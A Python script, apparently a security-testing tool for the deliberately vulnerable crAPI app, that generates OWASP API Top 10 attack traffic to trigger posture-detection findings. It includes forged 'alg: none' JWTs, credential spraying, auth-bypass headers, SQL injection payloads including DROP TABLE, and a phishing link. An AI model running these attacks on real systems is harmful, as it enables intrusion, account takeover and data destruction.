#!/usr/bin/env python3
"""
Posture Management Finding Generator for crAPI
Generates traffic patterns that trigger API security posture detections
Grouped by OWASP API Security Top 10 (2023)
"""

import base64
import hashlib
import hmac
import json
import random
import string
import time

import requests

# Reuse helpers from main script
try:
    from crapihacker import (
        vuln, safe, info, err, header,
        auth_headers, make_expired_rsa_jwt, HAS_CRYPTO
    )
except ImportError:
    # Fallback if run standalone
    def vuln(msg): print(f"  [VULNERABLE] {msg}")
    def safe(msg): print(f"  [NOT VULN]  {msg}")
    def info(msg): print(f"  [INFO]      {msg}")
    def err(msg): print(f"  [ERROR]     {msg}")
    def header(title): print(f"\n{'─'*60}\n{title}\n{'─'*60}")
    def auth_headers(token): return {"Authorization": f"Bearer {token}"}
    HAS_CRYPTO = False


def make_unsigned_jwt(email):
    """Create JWT with alg: none (unsigned)"""
    hdr = base64.urlsafe_b64encode(
        json.dumps({"typ": "JWT", "alg": "none"}).encode()
    ).rstrip(b"=").decode()
    now = int(time.time())
    pay = base64.urlsafe_b64encode(
        json.dumps({"sub": email, "iat": now, "exp": now + 3600}).encode()
    ).rstrip(b"=").decode()
    return f"{hdr}.{pay}."


def make_long_lived_jwt(email, secret="crAPI", exp_years=100):
    """Create JWT with excessively long lifespan"""
    now = int(time.time())
    hdr = base64.urlsafe_b64encode(
        json.dumps({"typ": "JWT", "alg": "HS256"}).encode()
    ).rstrip(b"=").decode()
    pay = base64.urlsafe_b64encode(
        json.dumps({
            "sub": email,
            "iat": now,
            "exp": now + (60 * 60 * 24 * 365 * exp_years)  # 100 years
        }).encode()
    ).rstrip(b"=").decode()
    msg = f"{hdr}.{pay}"
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    return f"{msg}.{sig}"


# ── POSTURE API2:2023 — Broken Authentication ─────────────────────────────────
def posture_api2(base, u1, t1, u2, t2):
    """
    API2:2023 — Broken Authentication (41 posture findings)
    - JWT issues (expired, unsigned, long lifespan)
    - Credential attacks (spraying, stuffing)
    - Weak auth mechanisms (Basic auth)
    - Auth details in URLs
    """
    header("POSTURE API2:2023 — Broken Authentication")

    # 1. Expired JWT Token
    info("Testing: API Accepts Expired JWT Token")
    if HAS_CRYPTO:
        expired = make_expired_rsa_jwt(u1["email"])
        r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                        headers={"Authorization": f"Bearer {expired}"},
                        timeout=10)
        if r.status_code == 200:
            vuln("API accepts expired JWT tokens")
        else:
            safe("API rejects expired JWT tokens")
    else:
        info("Skipped (needs pyjwt + cryptography)")

    # 2. Unsigned JWT Token
    info("Testing: API Accepts Unsigned JWT Tokens")
    unsigned = make_unsigned_jwt(u1["email"])
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                    headers={"Authorization": f"Bearer {unsigned}"},
                    timeout=10)
    if r.status_code == 200:
        vuln("API accepts unsigned JWT tokens (alg: none)")
    else:
        safe("API rejects unsigned JWT tokens")

    # 3. JWT with Excessively Long Lifespan
    info("Testing: JWT Token With Excessively Long Lifespan")
    long_jwt = make_long_lived_jwt(u1["email"], exp_years=100)
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                    headers={"Authorization": f"Bearer {long_jwt}"},
                    timeout=10)
    # Note: This tests if we can SEND it; detection is based on exp claim analysis
    info(f"Sent JWT with 100-year expiration (detection happens in posture analysis)")

    # 4. Basic Authentication
    info("Testing: Host Allows Basic Authentication Method")
    creds = base64.b64encode(b"testuser:testpass").decode()
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                    headers={"Authorization": f"Basic {creds}"},
                    timeout=10)
    if r.status_code != 401 or "Basic" in r.headers.get("WWW-Authenticate", ""):
        info("API may support Basic authentication (check posture detection)")

    # 5. Auth Details in Path Parameters
    info("Testing: Exposes Authentication Details in Path Parameters")
    requests.get(f"{base}/identity/api/v2/user/token_{t1[:16]}/profile", timeout=10)
    requests.get(f"{base}/workshop/api/merchant/secret_abc123/orders", timeout=10)
    info("Sent tokens in path parameters")

    # 6. Auth Details in Query Parameters
    info("Testing: Host Exposes Authentication Details in Query Parameters")
    requests.get(f"{base}/identity/api/v2/user/dashboard?token={t1[:32]}",
                headers=auth_headers(t1), timeout=10)
    requests.get(f"{base}/identity/api/v2/user/dashboard?api_key=secret123",
                headers=auth_headers(t1), timeout=10)
    info("Sent auth credentials in query parameters")

    # 7. Credential Spraying
    info("Testing: API Permits Credentials Spraying")
    passwords = ["Password123!", "Admin123!", "Test123!", "Welcome123!"]
    for pwd in passwords:
        try:
            requests.post(f"{base}/identity/api/auth/login",
                         json={"email": "admin@example.com", "password": pwd},
                         timeout=5)
            time.sleep(0.1)  # Small delay between attempts
        except:
            pass
    info(f"Attempted credential spraying (same user, {len(passwords)} passwords)")

    # 8. Credential Stuffing
    info("Testing: API Permits Credentials Stuffing")
    combos = [
        ("admin@test.com", "admin"),
        ("user@test.com", "password"),
        ("test@test.com", "test123"),
        ("root@test.com", "root")
    ]
    for email, pwd in combos:
        try:
            requests.post(f"{base}/identity/api/auth/login",
                         json={"email": email, "password": pwd},
                         timeout=5)
            time.sleep(0.1)
        except:
            pass
    info(f"Attempted credential stuffing ({len(combos)} username:password combos)")

    # 9. Authentication Bypass attempts
    info("Testing: API Vulnerable to Authentication Bypass")
    # Try various bypass techniques
    bypass_headers = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
    ]
    for hdrs in bypass_headers:
        requests.get(f"{base}/identity/api/v2/admin/users",
                    headers={**auth_headers(t1), **hdrs}, timeout=10)
    info("Attempted authentication bypass techniques")


# ── POSTURE API3:2023 — Broken Object Property Level Authorization ────────────
def posture_api3(base, u1, t1, u2, t2):
    """
    API3:2023 — Broken Object Property Level Authorization (87 findings)
    - Excessive data exposure
    - Forbidden/sensitive data exposure
    - Stack traces with sensitive info
    - Data in error messages
    """
    header("POSTURE API3:2023 — Broken Object Property Level Authorization")

    # 1. API Exposes Sensitive Data Without Authentication
    info("Testing: Exposes Sensitive Data Without Authentication")
    endpoints = [
        "/identity/api/v2/user/dashboard",
        "/workshop/api/shop/orders",
        "/community/api/v2/community/posts",
    ]
    for ep in endpoints:
        r = requests.get(f"{base}{ep}", timeout=10)
        if r.status_code == 200:
            vuln(f"Endpoint {ep} accessible without auth")
        else:
            safe(f"Endpoint {ep} requires auth")

    # 2. Stack Trace Exposure
    info("Testing: API Responds with Internal Server Error Stack Trace")
    # Trigger various errors
    malformed_requests = [
        # Malformed JSON
        (f"{base}/community/api/v2/community/posts", {"data": '{"broken": json'}),
        # Invalid type
        (f"{base}/workshop/api/shop/orders", {"json": {"order_id": "INVALID_STRING"}}),
        # SQL injection to trigger errors
        (f"{base}/community/api/v2/community/posts?id=1' OR '1'='1", {}),
    ]
    for url, kwargs in malformed_requests:
        try:
            if 'data' in kwargs:
                r = requests.post(url, headers=auth_headers(t1), **kwargs, timeout=10)
            elif 'json' in kwargs:
                r = requests.post(url, headers=auth_headers(t1), **kwargs, timeout=10)
            else:
                r = requests.get(url, headers=auth_headers(t1), timeout=10)

            # Check for stack traces in response
            if any(trace_keyword in r.text.lower() for trace_keyword in
                   ['traceback', 'exception', 'stack trace', 'file "/', 'line ']):
                vuln(f"Stack trace exposed: {url}")
        except:
            pass

    # 3. Sensitive Data in Error Response
    info("Testing: Returns Sensitive Data in Error Message")
    requests.get(f"{base}/workshop/api/shop/orders/999999",
                headers=auth_headers(t1), timeout=10)
    requests.get(f"{base}/identity/api/v2/user/email@test.com",
                headers=auth_headers(t1), timeout=10)
    info("Triggered errors to check for sensitive data leakage")

    # 4. Forbidden Data Exposure
    info("Testing: API Exposes Forbidden Data")
    sensitive_fields = [
        "/identity/api/v2/user/dashboard",  # May contain SSN, card numbers
        "/workshop/api/shop/orders",         # May contain payment info
    ]
    for endpoint in sensitive_fields:
        r = requests.get(f"{base}{endpoint}", headers=auth_headers(t1), timeout=10)
        if r.status_code == 200:
            # Check for sensitive data patterns
            text = r.text.lower()
            if any(field in text for field in ['ssn', 'credit_card', 'cvv', 'password']):
                vuln(f"Forbidden fields exposed: {endpoint}")
            info(f"Checked {endpoint} for forbidden data")

    # 5. Excessive Data in Older API Version
    info("Testing: API Exposes Excessive Data In An Older Version")
    # Try v1 endpoints if they exist
    v1_endpoints = [
        "/identity/api/v1/user/dashboard",
        "/workshop/api/v1/shop/orders",
    ]
    for endpoint in v1_endpoints:
        requests.get(f"{base}{endpoint}", headers=auth_headers(t1), timeout=10)
    info("Tested older API versions for excessive data exposure")

    # 6. Shared Authorization (cross-user data access)
    info("Testing: Exposes Data Using a Shared Authorization")
    # Try accessing victim's data with attacker's token
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                    headers=auth_headers(t1), timeout=10)
    if r.status_code == 200:
        data = r.json()
        # This would expose victim data if authorization is shared
        info("Attempted cross-user data access with shared authorization")


# ── POSTURE API4:2023 — Unrestricted Resource Consumption ────────────────────
def posture_api4(base, u1, t1, u2, t2):
    """
    API4:2023 — Unrestricted Resource Consumption (11 findings)
    - SQL injection patterns (Direct DB Access)
    - Mass email/SMS sending
    - Insecure protocols (HTTP instead of HTTPS)
    """
    header("POSTURE API4:2023 — Unrestricted Resource Consumption")

    # 1. Direct DB Access (SQL Injection patterns)
    info("Testing: API Contains a Direct DB Access")
    sqli_payloads = [
        "' OR '1'='1",
        "1' UNION SELECT NULL,NULL,NULL--",
        "admin'--",
        "1' AND 1=1--",
        "1' ORDER BY 10--",
        "'; DROP TABLE users--",
    ]

    # Test in query parameters
    for payload in sqli_payloads:
        requests.get(f"{base}/community/api/v2/community/posts?id={payload}",
                    headers=auth_headers(t1), timeout=10)

    # Test in path parameters
    for payload in sqli_payloads:
        requests.get(f"{base}/workshop/api/shop/orders/{payload}",
                    headers=auth_headers(t1), timeout=10)

    # Test in POST body
    for payload in sqli_payloads:
        requests.post(f"{base}/community/api/v2/community/posts",
                     headers=auth_headers(t1),
                     json={"title": payload, "content": "test"},
                     timeout=10)

    info(f"Sent {len(sqli_payloads) * 3} SQL injection patterns")

    # 2. Mass Email Sending
    info("Testing: API Allows Sending Phishing Emails")
    email_payload = {
        "to": "victim@test.com",
        "subject": "Password Reset",
        "body": "Click here: http://evil.com"
    }
    # Try to send via contact/report endpoints
    endpoints = [
        "/workshop/api/mechanic/receive_report",
        "/community/api/v2/coupon/validate-coupon",  # May have email field
    ]
    for endpoint in endpoints:
        try:
            requests.post(f"{base}{endpoint}",
                         headers=auth_headers(t1),
                         json=email_payload,
                         timeout=10)
        except:
            pass
    info("Attempted mass email sending")

    # 3. Insecure HTTP (if base is HTTPS, try HTTP version)
    if base.startswith("https://"):
        info("Testing: Listening on Insecure Port without Redirection")
        http_base = base.replace("https://", "http://")
        try:
            r = requests.get(f"{http_base}/identity/api/v2/user/dashboard",
                           headers=auth_headers(t1), timeout=10)
            if r.status_code == 200:
                vuln("API accessible over insecure HTTP")
            elif r.status_code in [301, 302, 307, 308]:
                safe("API redirects HTTP to HTTPS")
        except:
            safe("HTTP not accessible")


# ── POSTURE API5:2023 — Broken Function Level Authorization ──────────────────
def posture_api5(base, u1, t1, u2, t2):
    """
    API5:2023 — Broken Function Level Authorization (13 findings)
    - Unauthenticated modifications (POST/PUT/DELETE)
    - Shared authorization for modifications
    """
    header("POSTURE API5:2023 — Broken Function Level Authorization")

    # 1. Unauthenticated Modification
    info("Testing: API Allows Unauthenticated Modification")

    # POST without auth
    r = requests.post(f"{base}/community/api/v2/community/posts",
                     json={"title": "Unauthorized Post", "content": "No auth token"},
                     timeout=10)
    if r.status_code in [200, 201]:
        vuln("POST allowed without authentication")
    else:
        safe("POST requires authentication")

    # PUT without auth
    requests.put(f"{base}/identity/api/v2/user/dashboard",
                json={"name": "Attacker Name"},
                timeout=10)

    # DELETE without auth
    requests.delete(f"{base}/community/api/v2/community/posts/1", timeout=10)

    info("Attempted unauthenticated modifications (POST/PUT/DELETE)")

    # 2. Modification with Shared Authorization
    info("Testing: Allows Modification Using a Shared Authorization")
    # Try to modify victim's data with attacker's token
    modification_attempts = [
        (f"{base}/identity/api/v2/vehicle/vehicles", {"json": {"name": "Stolen"}}),
        (f"{base}/workshop/api/shop/orders/1", {"json": {"status": "cancelled"}}),
    ]
    for url, kwargs in modification_attempts:
        requests.put(url, headers=auth_headers(t1), **kwargs, timeout=10)
    info("Attempted cross-user modifications")

    # 3. GraphQL Unauthenticated Modification
    info("Testing: GraphQL API Allows Unauthenticated Modification")
    mutation = {
        "query": """
        mutation {
            updateUser(id: 1, name: "Attacker") {
                id
                name
            }
        }
        """
    }
    requests.post(f"{base}/graphql", json=mutation, timeout=10)
    info("Attempted unauthenticated GraphQL mutation")


# ── POSTURE API6:2023 — Unrestricted Access to Sensitive Business Flows ──────
def posture_api6(base, u1, t1, u2, t2):
    """
    API6:2023 — Unrestricted Access to Sensitive Business Flows (4 findings)
    - Direct DB access patterns
    """
    header("POSTURE API6:2023 — Unrestricted Access to Sensitive Business Flows")

    info("Testing: Unrestricted Database Access Patterns")
    # More targeted SQL injection for business logic
    business_sqli = [
        "' OR 1=1 LIMIT 1000--",  # Bulk data extraction
        "' UNION SELECT username,password,1 FROM users--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    ]
    for payload in business_sqli:
        requests.get(f"{base}/workshop/api/shop/orders?order_id={payload}",
                    headers=auth_headers(t1), timeout=10)
    info("Tested business flow SQL injection patterns")


# ── POSTURE API8:2023 — Security Misconfiguration ────────────────────────────
def posture_api8(base, u1, t1, u2, t2):
    """
    API8:2023 — Security Misconfiguration (89 findings)
    - GraphQL introspection
    - CORS misconfigurations
    - Sensitive data in query/path params
    - Server information disclosure
    """
    header("POSTURE API8:2023 — Security Misconfiguration")

    # 1. GraphQL Introspection
    info("Testing: API Supports GraphQL Introspection Queries")
    introspection = {
        "query": """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                types {
                    name
                    kind
                    fields {
                        name
                        type { name }
                    }
                }
            }
        }
        """
    }
    r = requests.post(f"{base}/graphql", json=introspection, timeout=10)
    if r.status_code == 200 and "__schema" in r.text:
        vuln("GraphQL introspection enabled")
    else:
        safe("GraphQL introspection disabled or endpoint not available")

    # 2. Unauthenticated GraphQL Introspection
    info("Testing: GraphQL Allows Unauthenticated Introspection")
    r = requests.post(f"{base}/graphql", json=introspection, timeout=10)  # No auth header
    if r.status_code == 200:
        vuln("GraphQL introspection accessible without auth")

    # 3. CORS Misconfiguration
    info("Testing: CORS Misconfiguration")
    evil_origins = [
        "https://evil.com",
        "http://attacker.com",
        "null",
        "https://api.example.com.evil.com",
    ]
    for origin in evil_origins:
        r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                        headers={**auth_headers(t1), "Origin": origin},
                        timeout=10)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        if acao == "*" or acao == origin:
            vuln(f"CORS allows origin: {origin}")

    # 4. Sensitive Data in Query Parameters
    info("Testing: Receives Sensitive Data in Query Params")
    sensitive_in_query = [
        f"{base}/identity/api/auth/verify?email={u1['email']}&password={u1['password']}",
        f"{base}/workshop/api/shop/checkout?credit_card=4111111111111111&cvv=123",
        f"{base}/identity/api/user/lookup?ssn=123-45-6789",
    ]
    for url in sensitive_in_query:
        requests.get(url, headers=auth_headers(t1), timeout=10)
    info("Sent sensitive data in query parameters")

    # 5. Sensitive Data in Path Parameters
    info("Testing: Receives Sensitive Data in Path Params")
    requests.get(f"{base}/identity/api/user/{u1['email']}/profile",
                headers=auth_headers(t1), timeout=10)
    requests.get(f"{base}/workshop/api/payment/4111111111111111",
                headers=auth_headers(t1), timeout=10)
    info("Sent sensitive data in path parameters")

    # 6. Server Information Disclosure
    info("Testing: Broad Technical Information Exposed")
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                    headers=auth_headers(t1), timeout=10)
    headers_to_check = ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"]
    for hdr in headers_to_check:
        if hdr in r.headers:
            vuln(f"Server info disclosed: {hdr}: {r.headers[hdr]}")

    # 7. Internal FQDN Exposure
    info("Testing: API Server Exposes Internal FQDN Name")
    # Check for internal hostnames in responses
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                    headers=auth_headers(t1), timeout=10)
    if r.status_code == 200:
        internal_patterns = ['.internal', '.local', '.corp', 'localhost', '127.0.0.1', '10.', '172.', '192.168.']
        for pattern in internal_patterns:
            if pattern in r.text:
                vuln(f"Internal FQDN/IP pattern found: {pattern}")


# ── POSTURE API9:2023 — Improper Inventory Management ────────────────────────
def posture_api9(base, u1, t1, u2, t2):
    """
    API9:2023 — Improper Inventory Management (3 findings)
    - Older API versions with excessive data
    - Missing API management layer
    """
    header("POSTURE API9:2023 — Improper Inventory Management")

    # 1. Older API Versions
    info("Testing: Excessive Data In Older Versions")
    versions = ["v1", "v0", "beta", "alpha"]
    endpoints = [
        "/identity/api/{}/user/dashboard",
        "/workshop/api/{}/shop/orders",
        "/community/api/{}/community/posts",
    ]
    for version in versions:
        for ep in endpoints:
            url = f"{base}{ep.format(version)}"
            r = requests.get(url, headers=auth_headers(t1), timeout=10)
            if r.status_code == 200:
                info(f"Older API version accessible: {version}")

    # 2. API Documentation Exposure
    info("Testing: API Documentation Leakage")
    doc_endpoints = [
        "/api/docs",
        "/api/swagger",
        "/swagger.json",
        "/openapi.json",
        "/api-docs",
        "/docs",
        "/redoc",
    ]
    for endpoint in doc_endpoints:
        r = requests.get(f"{base}{endpoint}", timeout=10)
        if r.status_code == 200:
            vuln(f"API documentation exposed: {endpoint}")


# ── POSTURE API10:2023 — Unsafe Consumption of APIs ──────────────────────────
def posture_api10(base, u1, t1, u2, t2):
    """
    API10:2023 — Unsafe Consumption of APIs (2 findings)
    - OAuth flow vulnerabilities
    """
    header("POSTURE API10:2023 — Unsafe Consumption of APIs")

    # 1. Deprecated OAuth Implicit Flow
    info("Testing: Deprecated OAuth Flow (Implicit Grant)")
    oauth_implicit = {
        "response_type": "token",  # Implicit flow
        "client_id": "crapi-client",
        "redirect_uri": f"{base}/callback",
        "scope": "read write"
    }
    r = requests.get(f"{base}/identity/api/auth/oauth/authorize",
                    params=oauth_implicit, timeout=10)
    if "access_token" in r.text or "token" in r.url:
        vuln("OAuth Implicit Flow detected (deprecated)")

    # 2. OAuth ROPC Flow
    info("Testing: OAuth ROPC Flow (Resource Owner Password Credentials)")
    ropc_payload = {
        "grant_type": "password",
        "username": u1["email"],
        "password": u1["password"],
        "client_id": "crapi-client"
    }
    r = requests.post(f"{base}/identity/api/auth/oauth/token",
                     data=ropc_payload, timeout=10)
    if r.status_code == 200 and "access_token" in r.text:
        vuln("OAuth ROPC Flow enabled (account takeover risk)")


# ── Main Entry Point ──────────────────────────────────────────────────────────
def run_all_posture_attacks(base, u1, t1, u2, t2):
    """Run all posture finding generators"""
    print(f"\n{'='*80}")
    print(f"{'POSTURE MANAGEMENT FINDING GENERATOR':^80}")
    print(f"{'Generates traffic patterns for API security posture detection':^80}")
    print(f"{'='*80}")

    posture_api2(base, u1, t1, u2, t2)
    posture_api3(base, u1, t1, u2, t2)
    posture_api4(base, u1, t1, u2, t2)
    posture_api5(base, u1, t1, u2, t2)
    posture_api6(base, u1, t1, u2, t2)
    posture_api8(base, u1, t1, u2, t2)
    posture_api9(base, u1, t1, u2, t2)
    posture_api10(base, u1, t1, u2, t2)

    print(f"\n{'='*80}")
    print(f"{'POSTURE ATTACK SIMULATION COMPLETE':^80}")
    print(f"{'='*80}\n")
